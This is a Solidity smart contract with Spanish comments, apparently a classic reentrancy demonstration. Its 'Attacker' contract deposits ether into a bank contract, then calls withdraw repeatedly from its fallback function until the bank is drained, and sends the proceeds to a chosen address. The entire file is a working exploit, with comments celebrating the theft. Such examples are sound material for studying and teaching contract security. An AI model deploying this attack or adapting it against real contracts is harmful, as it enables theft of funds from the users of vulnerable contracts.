// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IBank {
  function deposit() external payable;
  function withdraw() external;
  function getBalance() external view returns (uint256);
}

contract Attacker {

  IBank public immutable bank; // contrato que queremos hackear
  address public owner;
  constructor(IBank _bank) {
    bank = _bank;
  }

  function attack(address alice) public payable {
    bank.deposit{value: msg.value}(); // depositamos una cantiad de ether en el contrato Bank
    
    // somos pobres

    bank.withdraw();

    // somos ricos

    // enviar dinero a alice
    (bool sent, ) = alice.call{value: address(this).balance}("");
  
    require(sent, "Fail ether transfer");
  }

  fallback() external payable {
    if(bank.getBalance() > 0) { // revisamos que el banco tenga dinero
      // ataco
      bank.withdraw();
    }
  }

}